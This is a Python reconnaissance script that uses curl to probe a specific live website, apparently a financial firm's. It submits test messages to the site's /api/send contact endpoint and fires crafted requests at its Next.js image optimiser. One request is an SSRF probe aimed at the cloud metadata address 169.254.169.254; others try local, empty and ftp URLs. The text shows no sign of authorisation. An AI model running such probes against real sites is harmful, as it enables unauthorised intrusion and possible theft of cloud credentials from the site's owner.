#!/usr/bin/env python3
"""IC15 pass 2: real app surfaces - /api/send, /_next/image. Cache-bust, output to /tmp."""
import subprocess, os, random, re
H = "https://www.infinitycapital.bh"
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
D = "/tmp/ic15"; os.makedirs(D, exist_ok=True)

def req(method, path, data=None, hdrs=None, tag="t", maxt=25):
    sep = "&" if "?" in path else "?"
    url = H + path + sep + f"cb={random.randint(10**9,10**10)}"
    out = f"{D}/{tag}.body"
    cmd = ["curl","-s","-X",method,"-o",out,"-D",f"{D}/{tag}.hdr",
           "-w","WCODE=%{http_code} WSIZE=%{size_download} WT=%{time_total}","-A",UA,
           "--max-time",str(maxt),url]
    for k,v in (hdrs or {}).items(): cmd += ["-H", f"{k}: {v}"]
    if data is not None: cmd += ["--data-binary", data]
    subprocess.run(cmd, capture_output=True, text=True)
    hdr = open(f"{D}/{tag}.hdr").read() if os.path.exists(f"{D}/{tag}.hdr") else ""
    body = open(out,"rb").read() if os.path.exists(out) else b""
    return hdr, body

KEEP = ("http/","content-type","x-vercel-cache","set-cookie","server","x-matched-path","location","allow","content-length")
def show(tag, hdr, body, w=280):
    keep = [l.strip() for l in hdr.splitlines() if l.split(":")[0].strip().lower() in KEEP]
    print(f"--- {tag}: {keep}")
    print("    body:", body[:w])

print("=== /api/send ===")
for tag,m,data,hd in [
    ("send_get","GET",None,None),
    ("send_post_empty","POST","",{"Content-Type":"application/json"}),
    ("send_post_json","POST",'{"name":"a","email":"a@b.com","message":"hi"}',{"Content-Type":"application/json"}),
    ("send_post_form","POST","name=a&email=a@b.com&message=hi",{"Content-Type":"application/x-www-form-urlencoded"}),
    ("send_post_ct","POST",'{"name":"a"}',{"Content-Type":"text/plain"}),
]:
    h,b = req(m,"/api/send",data,hd,tag); show(tag,h,b)

print("\n=== /_next/image (cache-busted) ===")
for tag,q in [
    ("img_ctf","/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080&q=75"),
    ("img_meta","/_next/image?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F&w=64&q=75"),
    ("img_local","/_next/image?url=%2Ffoo.png&w=64&q=75"),
    ("img_empty","/_next/image?url=&w=64&q=75"),
    ("img_ftp","/_next/image?url=ftp%3A%2F%2Ffoo%2Fa.png&w=64&q=75"),
]:
    h,b = req("GET",q,tag=tag); show(tag,h,b,200)
